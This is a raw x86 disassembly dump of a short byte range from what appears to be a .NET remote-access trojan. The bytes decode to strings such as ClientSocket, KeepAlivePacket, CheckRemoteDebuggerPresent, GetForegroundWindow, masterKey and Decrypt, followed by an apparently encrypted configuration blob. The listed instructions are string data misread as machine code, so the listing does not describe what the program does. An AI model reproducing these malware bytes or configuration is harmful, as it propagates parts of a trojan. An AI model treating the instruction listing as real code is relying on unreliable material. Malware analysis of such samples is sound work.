  409180:	2e 4e                	cs dec %esi
  409182:	65 74 00             	gs je  0x409185
  409185:	53                   	push   %ebx
  409186:	65 74 00             	gs je  0x409189
  409189:	54                   	push   %esp
  40918a:	61                   	popa
  40918b:	72 67                	jb     0x4091f4
  40918d:	65 74 00             	gs je  0x409190
  409190:	43                   	inc    %ebx
  409191:	6c                   	insb   (%dx),%es:(%edi)
  409192:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  409199:	6e                   	outsb  %ds:(%esi),(%dx)
  40919a:	64 6c                	fs insb (%dx),%es:(%edi)
  40919c:	65 5f                	gs pop %edi
  40919e:	50                   	push   %eax
  40919f:	61                   	popa
  4091a0:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091a3:	74 00                	je     0x4091a5
  4091a5:	4b                   	dec    %ebx
  4091a6:	65 65 70 41          	gs gs jo 0x4091eb
  4091aa:	6c                   	insb   (%dx),%es:(%edi)
  4091ab:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091b2:	65 74 00             	gs je  0x4091b5
  4091b5:	43                   	inc    %ebx
  4091b6:	6c                   	insb   (%dx),%es:(%edi)
  4091b7:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091be:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091c2:	53                   	push   %ebx
  4091c3:	79 73                	jns    0x409238
  4091c5:	74 65                	je     0x40922c
  4091c7:	6d                   	insl   (%dx),%es:(%edi)
  4091c8:	2e 43                	cs inc %ebx
  4091ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4091cb:	6c                   	insb   (%dx),%es:(%edi)
  4091cc:	6c                   	insb   (%dx),%es:(%edi)
  4091cd:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d3:	73 2e                	jae    0x409203
  4091d5:	49                   	dec    %ecx
  4091d6:	45                   	inc    %ebp
  4091d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d8:	75 6d                	jne    0x409247
  4091da:	65 72 61             	gs jb  0x40923e
  4091dd:	74 6f                	je     0x40924e
  4091df:	72 2e                	jb     0x40920f
  4091e1:	52                   	push   %edx
  4091e2:	65 73 65             	gs jae 0x40924a
  4091e5:	74 00                	je     0x4091e7
  4091e7:	67 65 74 5f          	addr16 gs je 0x40924a
  4091eb:	4f                   	dec    %edi
  4091ec:	66 66 73 65          	data16 data16 jae 0x409255
  4091f0:	74 00                	je     0x4091f2
  4091f2:	73 65                	jae    0x409259
  4091f4:	74 5f                	je     0x409255
  4091f6:	4f                   	dec    %edi
  4091f7:	66 66 73 65          	data16 data16 jae 0x409260
  4091fb:	74 00                	je     0x4091fd
  4091fd:	53                   	push   %ebx
  4091fe:	70 6c                	jo     0x40926c
  409200:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  409207:	6e 
  409208:	74 4f                	je     0x409259
  40920a:	6e                   	outsb  %ds:(%esi),(%dx)
  40920b:	45                   	inc    %ebp
  40920c:	78 69                	js     0x409277
  40920e:	74 00                	je     0x409210
  409210:	53                   	push   %ebx
  409211:	61                   	popa
  409212:	6c                   	insb   (%dx),%es:(%edi)
  409213:	74 00                	je     0x409215
  409215:	49                   	dec    %ecx
  409216:	41                   	inc    %ecx
  409217:	73 79                	jae    0x409292
  409219:	6e                   	outsb  %ds:(%esi),(%dx)
  40921a:	63 52 65             	arpl   %edx,0x65(%edx)
  40921d:	73 75                	jae    0x409294
  40921f:	6c                   	insb   (%dx),%es:(%edi)
  409220:	74 00                	je     0x409222
  409222:	54                   	push   %esp
  409223:	6f                   	outsl  %ds:(%esi),(%dx)
  409224:	55                   	push   %ebp
  409225:	70 70                	jo     0x409297
  409227:	65 72 49             	gs jb  0x409273
  40922a:	6e                   	outsb  %ds:(%esi),(%dx)
  40922b:	76 61                	jbe    0x40928e
  40922d:	72 69                	jb     0x409298
  40922f:	61                   	popa
  409230:	6e                   	outsb  %ds:(%esi),(%dx)
  409231:	74 00                	je     0x409233
  409233:	57                   	push   %edi
  409234:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409238:	69 65 6e 74 00 41 73 	imul   $0x73410074,0x6e(%ebp),%esp
  40923f:	79 6e                	jns    0x4092af
  409241:	63 43 6c             	arpl   %eax,0x6c(%ebx)
  409244:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  40924b:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409252:	65 
  409253:	43                   	inc    %ebx
  409254:	6c                   	insb   (%dx),%es:(%edi)
  409255:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40925c:	74 5f                	je     0x4092bd
  40925e:	53                   	push   %ebx
  40925f:	73 6c                	jae    0x4092cd
  409261:	43                   	inc    %ebx
  409262:	6c                   	insb   (%dx),%es:(%edi)
  409263:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40926a:	74 5f                	je     0x4092cb
  40926c:	53                   	push   %ebx
  40926d:	73 6c                	jae    0x4092db
  40926f:	43                   	inc    %ebx
  409270:	6c                   	insb   (%dx),%es:(%edi)
  409271:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409278:	74 5f                	je     0x4092d9
  40927a:	54                   	push   %esp
  40927b:	63 70 43             	arpl   %esi,0x43(%eax)
  40927e:	6c                   	insb   (%dx),%es:(%edi)
  40927f:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409286:	74 5f                	je     0x4092e7
  409288:	54                   	push   %esp
  409289:	63 70 43             	arpl   %esi,0x43(%eax)
  40928c:	6c                   	insb   (%dx),%es:(%edi)
  40928d:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409294:	74 68                	je     0x4092fe
  409296:	65 6e                	outsb  %gs:(%esi),(%dx)
  409298:	74 69                	je     0x409303
  40929a:	63 61 74             	arpl   %esp,0x74(%ecx)
  40929d:	65 41                	gs inc %ecx
  40929f:	73 43                	jae    0x4092e4
  4092a1:	6c                   	insb   (%dx),%es:(%edi)
  4092a2:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  4092a9:	73 74                	jae    0x40931f
  4092ab:	65 6d                	gs insl (%dx),%es:(%edi)
  4092ad:	2e 4d                	cs dec %ebp
  4092af:	61                   	popa
  4092b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b1:	61                   	popa
  4092b2:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092b5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b7:	74 00                	je     0x4092b9
  4092b9:	45                   	inc    %ebp
  4092ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4092bb:	76 69                	jbe    0x409326
  4092bd:	72 6f                	jb     0x40932e
  4092bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c0:	6d                   	insl   (%dx),%es:(%edi)
  4092c1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092c3:	74 00                	je     0x4092c5
  4092c5:	70 61                	jo     0x409328
  4092c7:	72 65                	jb     0x40932e
  4092c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ca:	74 00                	je     0x4092cc
  4092cc:	53                   	push   %ebx
  4092cd:	79 73                	jns    0x409342
  4092cf:	74 65                	je     0x409336
  4092d1:	6d                   	insl   (%dx),%es:(%edi)
  4092d2:	2e 43                	cs inc %ebx
  4092d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4092d5:	6c                   	insb   (%dx),%es:(%edi)
  4092d6:	6c                   	insb   (%dx),%es:(%edi)
  4092d7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4092dd:	73 2e                	jae    0x40930d
  4092df:	49                   	dec    %ecx
  4092e0:	45                   	inc    %ebp
  4092e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e2:	75 6d                	jne    0x409351
  4092e4:	65 72 61             	gs jb  0x409348
  4092e7:	74 6f                	je     0x409358
  4092e9:	72 2e                	jb     0x409319
  4092eb:	43                   	inc    %ebx
  4092ec:	75 72                	jne    0x409360
  4092ee:	72 65                	jb     0x409355
  4092f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f1:	74 00                	je     0x4092f3
  4092f3:	53                   	push   %ebx
  4092f4:	79 73                	jns    0x409369
  4092f6:	74 65                	je     0x40935d
  4092f8:	6d                   	insl   (%dx),%es:(%edi)
  4092f9:	2e 43                	cs inc %ebx
  4092fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4092fc:	6c                   	insb   (%dx),%es:(%edi)
  4092fd:	6c                   	insb   (%dx),%es:(%edi)
  4092fe:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409303:	6e                   	outsb  %ds:(%esi),(%dx)
  409304:	73 2e                	jae    0x409334
  409306:	49                   	dec    %ecx
  409307:	45                   	inc    %ebp
  409308:	6e                   	outsb  %ds:(%esi),(%dx)
  409309:	75 6d                	jne    0x409378
  40930b:	65 72 61             	gs jb  0x40936f
  40930e:	74 6f                	je     0x40937f
  409310:	72 2e                	jb     0x409340
  409312:	67 65 74 5f          	addr16 gs je 0x409375
  409316:	43                   	inc    %ebx
  409317:	75 72                	jne    0x40938b
  409319:	72 65                	jb     0x409380
  40931b:	6e                   	outsb  %ds:(%esi),(%dx)
  40931c:	74 00                	je     0x40931e
  40931e:	47                   	inc    %edi
  40931f:	65 74 43             	gs je  0x409365
  409322:	75 72                	jne    0x409396
  409324:	72 65                	jb     0x40938b
  409326:	6e                   	outsb  %ds:(%esi),(%dx)
  409327:	74 00                	je     0x409329
  409329:	43                   	inc    %ebx
  40932a:	68 65 63 6b 52       	push   $0x526b6365
  40932f:	65 6d                	gs insl (%dx),%es:(%edi)
  409331:	6f                   	outsl  %ds:(%esi),(%dx)
  409332:	74 65                	je     0x409399
  409334:	44                   	inc    %esp
  409335:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409339:	67 65 72 50          	addr16 gs jb 0x40938d
  40933d:	72 65                	jb     0x4093a4
  40933f:	73 65                	jae    0x4093a6
  409341:	6e                   	outsb  %ds:(%esi),(%dx)
  409342:	74 00                	je     0x409344
  409344:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  40934b:	67 65 72 50          	addr16 gs jb 0x40939f
  40934f:	72 65                	jb     0x4093b6
  409351:	73 65                	jae    0x4093b8
  409353:	6e                   	outsb  %ds:(%esi),(%dx)
  409354:	74 00                	je     0x409356
  409356:	67 65 74 5f          	addr16 gs je 0x4093b9
  40935a:	52                   	push   %edx
  40935b:	65 6d                	gs insl (%dx),%es:(%edi)
  40935d:	6f                   	outsl  %ds:(%esi),(%dx)
  40935e:	74 65                	je     0x4093c5
  409360:	45                   	inc    %ebp
  409361:	6e                   	outsb  %ds:(%esi),(%dx)
  409362:	64 50                	fs push %eax
  409364:	6f                   	outsl  %ds:(%esi),(%dx)
  409365:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  40936c:	5f                   	pop    %edi
  40936d:	43                   	inc    %ebx
  40936e:	6f                   	outsl  %ds:(%esi),(%dx)
  40936f:	75 6e                	jne    0x4093df
  409371:	74 00                	je     0x409373
  409373:	67 65 74 5f          	addr16 gs je 0x4093d6
  409377:	50                   	push   %eax
  409378:	72 6f                	jb     0x4093e9
  40937a:	63 65 73             	arpl   %esp,0x73(%ebp)
  40937d:	73 6f                	jae    0x4093ee
  40937f:	72 43                	jb     0x4093c4
  409381:	6f                   	outsl  %ds:(%esi),(%dx)
  409382:	75 6e                	jne    0x4093f2
  409384:	74 00                	je     0x409386
  409386:	63 6f 75             	arpl   %ebp,0x75(%edi)
  409389:	6e                   	outsb  %ds:(%esi),(%dx)
  40938a:	74 00                	je     0x40938c
  40938c:	47                   	inc    %edi
  40938d:	65 74 50             	gs je  0x4093e0
  409390:	61                   	popa
  409391:	74 68                	je     0x4093fb
  409393:	52                   	push   %edx
  409394:	6f                   	outsl  %ds:(%esi),(%dx)
  409395:	6f                   	outsl  %ds:(%esi),(%dx)
  409396:	74 00                	je     0x409398
  409398:	44                   	inc    %esp
  409399:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40939d:	70 74                	jo     0x409413
  40939f:	00 45 6e             	add    %al,0x6e(%ebp)
  4093a2:	63 72 79             	arpl   %esi,0x79(%edx)
  4093a5:	70 74                	jo     0x40941b
  4093a7:	00 50 61             	add    %dl,0x61(%eax)
  4093aa:	72 61                	jb     0x40940d
  4093ac:	6d                   	insl   (%dx),%es:(%edi)
  4093ad:	65 74 65             	gs je  0x409415
  4093b0:	72 69                	jb     0x40941b
  4093b2:	7a 65                	jp     0x409419
  4093b4:	64 54                	fs push %esp
  4093b6:	68 72 65 61 64       	push   $0x64616572
  4093bb:	53                   	push   %ebx
  4093bc:	74 61                	je     0x40941f
  4093be:	72 74                	jb     0x409434
  4093c0:	00 43 6f             	add    %al,0x6f(%ebx)
  4093c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4093c4:	76 65                	jbe    0x40942b
  4093c6:	72 74                	jb     0x40943c
  4093c8:	00 46 61             	add    %al,0x61(%esi)
  4093cb:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093d2:	54 
  4093d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4093d4:	4c                   	dec    %esp
  4093d5:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093dc:	75 74                	jne    0x409452
  4093de:	00 53 79             	add    %dl,0x79(%ebx)
  4093e1:	73 74                	jae    0x409457
  4093e3:	65 6d                	gs insl (%dx),%es:(%edi)
  4093e5:	2e 43                	cs inc %ebx
  4093e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4093e8:	6c                   	insb   (%dx),%es:(%edi)
  4093e9:	6c                   	insb   (%dx),%es:(%edi)
  4093ea:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4093f0:	73 2e                	jae    0x409420
  4093f2:	49                   	dec    %ecx
  4093f3:	45                   	inc    %ebp
  4093f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4093f5:	75 6d                	jne    0x409464
  4093f7:	65 72 61             	gs jb  0x40945b
  4093fa:	74 6f                	je     0x40946b
  4093fc:	72 2e                	jb     0x40942c
  4093fe:	4d                   	dec    %ebp
  4093ff:	6f                   	outsl  %ds:(%esi),(%dx)
  409400:	76 65                	jbe    0x409467
  409402:	4e                   	dec    %esi
  409403:	65 78 74             	gs js  0x40947a
  409406:	00 53 79             	add    %dl,0x79(%ebx)
  409409:	73 74                	jae    0x40947f
  40940b:	65 6d                	gs insl (%dx),%es:(%edi)
  40940d:	2e 54                	cs push %esp
  40940f:	65 78 74             	gs js  0x409486
  409412:	00 47 65             	add    %al,0x65(%edi)
  409415:	74 57                	je     0x40946e
  409417:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40941e:	78 74                	js     0x409494
  409420:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  409424:	74 00                	je     0x409426
  409426:	76 00                	jbe    0x409428
  409428:	47                   	inc    %edi
  409429:	65 74 46             	gs je  0x409472
  40942c:	6f                   	outsl  %ds:(%esi),(%dx)
  40942d:	72 65                	jb     0x409494
  40942f:	67 72 6f             	addr16 jb 0x4094a1
  409432:	75 6e                	jne    0x4094a2
  409434:	64 57                	fs push %edi
  409436:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  40943d:	65 74 5f             	gs je  0x40949f
  409440:	43                   	inc    %ebx
  409441:	72 65                	jb     0x4094a8
  409443:	61                   	popa
  409444:	74 65                	je     0x4094ab
  409446:	4e                   	dec    %esi
  409447:	6f                   	outsl  %ds:(%esi),(%dx)
  409448:	57                   	push   %edi
  409449:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  409450:	6e                   	outsb  %ds:(%esi),(%dx)
  409451:	64 65 78 00          	fs gs js 0x409455
  409455:	43                   	inc    %ebx
  409456:	6c                   	insb   (%dx),%es:(%edi)
  409457:	6f                   	outsl  %ds:(%esi),(%dx)
  409458:	73 65                	jae    0x4094bf
  40945a:	4d                   	dec    %ebp
  40945b:	75 74                	jne    0x4094d1
  40945d:	65 78 00             	gs js  0x409460
  409460:	43                   	inc    %ebx
  409461:	72 65                	jb     0x4094c8
  409463:	61                   	popa
  409464:	74 65                	je     0x4094cb
  409466:	4d                   	dec    %ebp
  409467:	75 74                	jne    0x4094dd
  409469:	65 78 00             	gs js  0x40946c
  40946c:	44                   	inc    %esp
  40946d:	65 6c                	gs insb (%dx),%es:(%edi)
  40946f:	61                   	popa
  409470:	79 00                	jns    0x409472
  409472:	57                   	push   %edi
  409473:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  40947a:	61                   	popa
  40947b:	79 00                	jns    0x40947d
  40947d:	49                   	dec    %ecx
  40947e:	6e                   	outsb  %ds:(%esi),(%dx)
  40947f:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409486:	65 
  409487:	41                   	inc    %ecx
  409488:	72 72                	jb     0x4094fc
  40948a:	61                   	popa
  40948b:	79 00                	jns    0x40948d
  40948d:	4d                   	dec    %ebp
  40948e:	73 67                	jae    0x4094f7
  409490:	50                   	push   %eax
  409491:	61                   	popa
  409492:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  409495:	72 72                	jb     0x409509
  409497:	61                   	popa
  409498:	79 00                	jns    0x40949a
  40949a:	54                   	push   %esp
  40949b:	6f                   	outsl  %ds:(%esi),(%dx)
  40949c:	41                   	inc    %ecx
  40949d:	72 72                	jb     0x409511
  40949f:	61                   	popa
  4094a0:	79 00                	jns    0x4094a2
  4094a2:	67 65 74 5f          	addr16 gs je 0x409505
  4094a6:	41                   	inc    %ecx
  4094a7:	73 41                	jae    0x4094ea
  4094a9:	72 72                	jb     0x40951d
  4094ab:	61                   	popa
  4094ac:	79 00                	jns    0x4094ae
  4094ae:	72 65                	jb     0x409515
  4094b0:	66 41                	inc    %cx
  4094b2:	73 41                	jae    0x4094f5
  4094b4:	72 72                	jb     0x409528
  4094b6:	61                   	popa
  4094b7:	79 00                	jns    0x4094b9
  4094b9:	67 65 74 5f          	addr16 gs je 0x40951c
  4094bd:	4b                   	dec    %ebx
  4094be:	65 79 00             	gs jns 0x4094c1
  4094c1:	73 65                	jae    0x409528
  4094c3:	74 5f                	je     0x409524
  4094c5:	4b                   	dec    %ebx
  4094c6:	65 79 00             	gs jns 0x4094c9
  4094c9:	43                   	inc    %ebx
  4094ca:	72 65                	jb     0x409531
  4094cc:	61                   	popa
  4094cd:	74 65                	je     0x409534
  4094cf:	53                   	push   %ebx
  4094d0:	75 62                	jne    0x409534
  4094d2:	4b                   	dec    %ebx
  4094d3:	65 79 00             	gs jns 0x4094d6
  4094d6:	44                   	inc    %esp
  4094d7:	65 6c                	gs insb (%dx),%es:(%edi)
  4094d9:	65 74 65             	gs je  0x409541
  4094dc:	53                   	push   %ebx
  4094dd:	75 62                	jne    0x409541
  4094df:	4b                   	dec    %ebx
  4094e0:	65 79 00             	gs jns 0x4094e3
  4094e3:	4f                   	dec    %edi
  4094e4:	70 65                	jo     0x40954b
  4094e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e7:	53                   	push   %ebx
  4094e8:	75 62                	jne    0x40954c
  4094ea:	4b                   	dec    %ebx
  4094eb:	65 79 00             	gs jns 0x4094ee
  4094ee:	67 65 74 5f          	addr16 gs je 0x409551
  4094f2:	50                   	push   %eax
  4094f3:	75 62                	jne    0x409557
  4094f5:	6c                   	insb   (%dx),%es:(%edi)
  4094f6:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  4094fd:	61                   	popa
  4094fe:	75 74                	jne    0x409574
  409500:	68 4b 65 79 00       	push   $0x79654b
  409505:	6d                   	insl   (%dx),%es:(%edi)
  409506:	61                   	popa
  409507:	73 74                	jae    0x40957d
  409509:	65 72 4b             	gs jb  0x409557
  40950c:	65 79 00             	gs jns 0x40950f
  40950f:	52                   	push   %edx
  409510:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409517:	4b 65 
  409519:	79 00                	jns    0x40951b
  40951b:	5f                   	pop    %edi
  40951c:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  409520:	53                   	push   %ebx
  409521:	79 73                	jns    0x409596
  409523:	74 65                	je     0x40958a
  409525:	6d                   	insl   (%dx),%es:(%edi)
  409526:	2e 53                	cs push %ebx
  409528:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40952c:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409533:	70 
  409534:	74 6f                	je     0x4095a5
  409536:	67 72 61             	addr16 jb 0x40959a
  409539:	70 68                	jo     0x4095a3
  40953b:	79 00                	jns    0x40953d
  40953d:	41                   	inc    %ecx
  40953e:	73 73                	jae    0x4095b3
  409540:	65 6d                	gs insl (%dx),%es:(%edi)
  409542:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409546:	41                   	inc    %ecx
  409547:	64 64 72 65          	fs fs jb 0x4095b0
  40954b:	73 73                	jae    0x4095c0
  40954d:	46                   	inc    %esi
  40954e:	61                   	popa
  40954f:	6d                   	insl   (%dx),%es:(%edi)
  409550:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409557:	63 
  409558:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  40955c:	79 00                	jns    0x40955e
  40955e:	57                   	push   %edi
  40955f:	72 69                	jb     0x4095ca
  409561:	74 65                	je     0x4095c8
  409563:	42                   	inc    %edx
  409564:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  40956b:	6f                   	outsl  %ds:(%esi),(%dx)
  40956c:	42                   	inc    %edx
  40956d:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409574:	65 74 5f             	gs je  0x4095d6
  409577:	53                   	push   %ebx
  409578:	79 73                	jns    0x4095ed
  40957a:	74 65                	je     0x4095e1
  40957c:	6d                   	insl   (%dx),%es:(%edi)
  40957d:	44                   	inc    %esp
  40957e:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409585:	79 00                	jns    0x409587
  409587:	53                   	push   %ebx
  409588:	65 74 52             	gs je  0x4095dd
  40958b:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409592:	00 6f 
  409594:	70 5f                	jo     0x4095f5
  409596:	45                   	inc    %ebp
  409597:	71 75                	jno    0x40960e
  409599:	61                   	popa
  40959a:	6c                   	insb   (%dx),%es:(%edi)
  40959b:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  4095a2:	49 
  4095a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4095a4:	65 71 75             	gs jno 0x40961c
  4095a7:	61                   	popa
  4095a8:	6c                   	insb   (%dx),%es:(%edi)
  4095a9:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095b0:	74 
  4095b1:	65 6d                	gs insl (%dx),%es:(%edi)
  4095b3:	2e 4e                	cs dec %esi
  4095b5:	65 74 2e             	gs je  0x4095e6
  4095b8:	53                   	push   %ebx
  4095b9:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095bd:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095c4:	64 
  4095c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4095c6:	77 73                	ja     0x40963b
  4095c8:	49                   	dec    %ecx
  4095c9:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095cc:	74 69                	je     0x409637
  4095ce:	74 79                	je     0x409649
  4095d0:	00 49 73             	add    %cl,0x73(%ecx)
  4095d3:	4e                   	dec    %esi
  4095d4:	75 6c                	jne    0x409642
  4095d6:	6c                   	insb   (%dx),%es:(%edi)
  4095d7:	4f                   	dec    %edi
  4095d8:	72 45                	jb     0x40961f
  4095da:	6d                   	insl   (%dx),%es:(%edi)
  4095db:	70 74                	jo     0x409651
  4095dd:	79 00                	jns    0x4095df
  4095df:	00 00                	add    %al,(%eax)
  4095e1:	0d 53 00 48 00       	or     $0x480053,%eax
  4095e6:	41                   	inc    %ecx
  4095e7:	00 32                	add    %dh,(%edx)
  4095e9:	00 35 00 36 00 00    	add    %dh,0x3600
  4095ef:	81 01 50 00 34 00    	addl   $0x340050,(%ecx)
  4095f5:	45                   	inc    %ebp
  4095f6:	00 39                	add    %bh,(%ecx)
  4095f8:	00 49 00             	add    %cl,0x0(%ecx)
  4095fb:	51                   	push   %ecx
  4095fc:	00 55 00             	add    %dl,0x0(%ebp)
  4095ff:	78 00                	js     0x409601
  409601:	30 00                	xor    %al,(%eax)
  409603:	6e                   	outsb  %ds:(%esi),(%dx)
  409604:	00 71 00             	add    %dh,0x0(%ecx)
  409607:	61                   	popa
  409608:	00 48 00             	add    %cl,0x0(%eax)
  40960b:	74 00                	je     0x40960d
  40960d:	45                   	inc    %ebp
  40960e:	00 53 00             	add    %dl,0x0(%ebx)
  409611:	38 00                	cmp    %al,(%eax)
  409613:	4f                   	dec    %edi
  409614:	00 61 00             	add    %ah,0x0(%ecx)
  409617:	73 00                	jae    0x409619
  409619:	64 00 54 00 79       	add    %dl,%fs:0x79(%eax,%eax,1)
  40961e:	00 6f 00             	add    %ch,0x0(%edi)
  409621:	2f                   	das
  409622:	00 65 00             	add    %ah,0x0(%ebp)
  409625:	57                   	push   %edi
  409626:	00 2b                	add    %ch,(%ebx)
  409628:	00 39                	add    %bh,(%ecx)
  40962a:	00 48 00             	add    %cl,0x0(%eax)
  40962d:	76 00                	jbe    0x40962f
  40962f:	70 00                	jo     0x409631
  409631:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409635:	70 00                	jo     0x409637
  409637:	34 00                	xor    $0x0,%al
  409639:	47                   	inc    %edi
  40963a:	00 52 00             	add    %dl,0x0(%edx)
  40963d:	5a                   	pop    %edx
  40963e:	00 4a 00             	add    %cl,0x0(%edx)
  409641:	56                   	push   %esi
  409642:	00 31                	add    %dh,(%ecx)
  409644:	00 30                	add    %dh,(%eax)
  409646:	00 34 00             	add    %dh,(%eax,%eax,1)
  409649:	72 00                	jb     0x40964b
  40964b:	6b 00 38             	imul   $0x38,(%eax),%eax
  40964e:	00 65 00             	add    %ah,0x0(%ebp)
  409651:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  409655:	43                   	inc    %ebx
  409656:	00 37                	add    %dh,(%edi)
  409658:	00 52 00             	add    %dl,0x0(%edx)
  40965b:	4f                   	dec    %edi
  40965c:	00 33                	add    %dh,(%ebx)
  40965e:	00 4f 00             	add    %cl,0x0(%edi)
  409661:	38 00                	cmp    %al,(%eax)
  409663:	74 00                	je     0x409665
  409665:	72 00                	jb     0x409667
  409667:	6f                   	outsl  %ds:(%esi),(%dx)
  409668:	00 69 00             	add    %ch,0x0(%ecx)
  40966b:	46                   	inc    %esi
  40966c:	00 52 00             	add    %dl,0x0(%edx)
  40966f:	48                   	dec    %eax
  409670:	00 6d 00             	add    %ch,0x0(%ebp)
  409673:	31 00                	xor    %eax,(%eax)
  409675:	7a 00                	jp     0x409677
  409677:	39 00                	cmp    %eax,(%eax)
  409679:	79 00                	jns    0x40967b
  40967b:	74 00                	je     0x40967d
  40967d:	58                   	pop    %eax
  40967e:	00 6b 00             	add    %ch,0x0(%ebx)
  409681:	45                   	inc    %ebp
  409682:	00 5a 00             	add    %bl,0x0(%edx)
  409685:	77 00                	ja     0x409687
  409687:	6a 00                	push   $0x0
  409689:	59                   	pop    %ecx
  40968a:	00 68 00             	add    %ch,0x0(%eax)
  40968d:	62 00                	bound  %eax,(%eax)
  40968f:	50                   	push   %eax
  409690:	00 52 00             	add    %dl,0x0(%edx)
  409693:	33 00                	xor    (%eax),%eax
  409695:	42                   	inc    %edx
  409696:	00 58 00             	add    %bl,0x0(%eax)
  409699:	6c                   	insb   (%dx),%es:(%edi)
  40969a:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40969e:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  4096a2:	00 51 00             	add    %dl,0x0(%ecx)
  4096a5:	33 00                	xor    (%eax),%eax
  4096a7:	41                   	inc    %ecx
  4096a8:	00 62 00             	add    %ah,0x0(%edx)
  4096ab:	41                   	inc    %ecx
  4096ac:	00 38                	add    %bh,(%eax)
  4096ae:	00 6b 00             	add    %ch,0x0(%ebx)
  4096b1:	75 00                	jne    0x4096b3
  4096b3:	6a 00                	push   $0x0
  4096b5:	46                   	inc    %esi
  4096b6:	00 43 00             	add    %al,0x0(%ebx)
  4096b9:	71 00                	jno    0x4096bb
  4096bb:	79 00                	jns    0x4096bd
  4096bd:	59                   	pop    %ecx
  4096be:	00 4a 00             	add    %cl,0x0(%edx)
  4096c1:	71 00                	jno    0x4096c3
  4096c3:	35 00 78 00 47       	xor    $0x47007800,%eax
  4096c8:	00 2b                	add    %ch,(%ebx)
